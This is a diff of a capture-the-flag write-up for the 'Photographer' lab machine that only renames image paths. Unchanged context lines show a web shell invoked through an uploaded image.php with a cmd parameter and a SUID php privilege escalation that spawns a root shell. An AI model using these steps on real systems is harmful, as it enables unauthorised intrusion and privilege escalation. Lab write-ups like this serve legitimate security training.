@@ -42,7 +42,7 @@ Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Web PORT: 8000
 
-![img](/assets/images/CTF/Pg-Play/Photographer/web1.png)
+![img](/assets/images/CTF/Proving_Grounds/Photographer/web1.png)
 
 The meta data in the landing page `http://192.168.193.76:8000/` source revealed the CMS version.
 
@@ -55,7 +55,7 @@ The version `Koken 0.22.24` is vulnerable to [Koken CMS 0.22.24 - Arbitrary File
 
 http://192.168.193.76:8000/admin/
 
-![img](/assets/images/CTF/Pg-Play/Photographer/web2.png)
+![img](/assets/images/CTF/Proving_Grounds/Photographer/web2.png)
 
 ## SMB Share
 
@@ -119,7 +119,7 @@ Once the file is uploaded click on the file and on the right side scroll down an
 http://192.168.193.76:8000/storage/originals/f2/10/image.php?cmd=id
 ```
 
-![img](/assets/images/CTF/Pg-Play/Photographer/shell.png)
+![img](/assets/images/CTF/Proving_Grounds/Photographer/shell.png)
 
 ## Privilege Escalation
 
@@ -168,7 +168,7 @@ sudo install -m =xs $(which php) .
     ./php -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
 
-![img](/assets/images/CTF/Pg-Play/Photographer/root.png)
+![img](/assets/images/CTF/Proving_Grounds/Photographer/root.png)
 
 **Root Obtained**
 
